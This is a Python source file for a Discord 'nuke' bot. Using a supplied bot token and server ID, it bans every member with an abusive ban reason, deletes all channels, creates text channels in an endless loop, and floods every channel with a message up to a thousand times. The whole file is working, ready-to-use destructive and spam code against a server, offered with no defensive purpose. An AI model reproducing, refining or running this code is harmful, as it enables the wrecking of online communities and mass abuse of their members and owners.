import threading, traceback, datetime, discord, asyncio, ctypes, time

logs = {}
stops = []

intents = discord.Intents.all()
class DiscordBot(discord.Client):
    def __init__(self, logId:str, token:str, guildId:int, channelName:str, latency:int, message:str, allUserBan:bool, allChannelDelete:bool):
        super().__init__(intents=intents)
        self.logId = logId
        self.token = token
        self.guildId = guildId
        self.channelName = channelName
        self.nukeLatency = latency
        self.message = message
        self.allUserBan = allUserBan
        self.allChannelDelete = allChannelDelete
        
        self.channels = None
    async def banUser(self, user:discord.Member):
        try:
            await user.ban(reason="Fuck Server User")
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" | {str(datetime.datetime.now())} BanUser ID:{user.id} Name:{user.name}\n"
    async def deleteChannel(self, channel:discord.abc.GuildChannel):
        try:
            await channel.delete()
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" | {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
    async def sendMessage(self, message:str, channel:discord.TextChannel, latencyMs:float):
        try:
            await channel.send(message)
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" | {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
        await asyncio.sleep(latencyMs)
    async def banAllUser(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllUserBan ----\n"
        async for member in guild.fetch_members():
            await self.banUser(member)
        logs[self.logId] += "---- End ----\n\n\n"
    async def deleteAllChannel(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllChannelDelete ----\n"
        await asyncio.gather(*(self.deleteChannel(channel) for channel in guild.channels))
        logs[self.logId] += "---- End ----\n\n\n"
    async def channelMaker(self, channelName:str, guild:discord.Guild):
        while True:
            try:
                if self.logId in stops:
                    logs.pop(self.logId)
                    await self.close()
                    return
            except:
                return
            try:
                channel = await guild.create_text_channel(channelName)
                self.channels.append(channel)
            except:
                pass
    async def nuke(self, latency:int, message:str, guild:discord.Guild, channelName:str, numberOfExecutions=1000):
        logs[self.logId] += "---- Start Nuke ----\n"
        try:
            await asyncio.gather(*(guild.create_text_channel(channelName) for i in range(30)))
            self.channels = list(guild.channels)
            asyncio.ensure_future(self.channelMaker(channelName, guild))
            for _ in range(numberOfExecutions):
                if self.logId in stops:
                    logs.pop(self.logId)
                    await self.close()
                    return
                logs[self.logId] += "--- Nuke ---\n"
                await asyncio.gather(*(self.sendMessage(message, channel, latency*0.001) for channel in self.channels))
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
        logs[self.logId] += "---- End ----\n"
        stops.append(self.logId)
        await self.close()
    async def on_ready(self):
        logs[self.logId] += f"ID:{self.user.id}, Name:{self.user.name}\n\n"
        self.guild = self.get_guild(self.guildId)
        if not self.guild:
            logs[self.logId] += f"Error: The server you entered has not been joined by a bot."
            await self.close()
            return
        if self.allUserBan:
            await self.banAllUser(self.guild)
        if self.allChannelDelete:
            await self.deleteAllChannel(self.guild)
        await self.nuke(self.nukeLatency, self.message, self.guild, self.channelName)
    async def on_message(self, message):
        if message.author.bot:
            return
    def runBot(self):
        try:
            self.run(self.token, reconnect=True)
        except:
            logs[self.logId] += f"Error:\n{traceback.format_exc()}"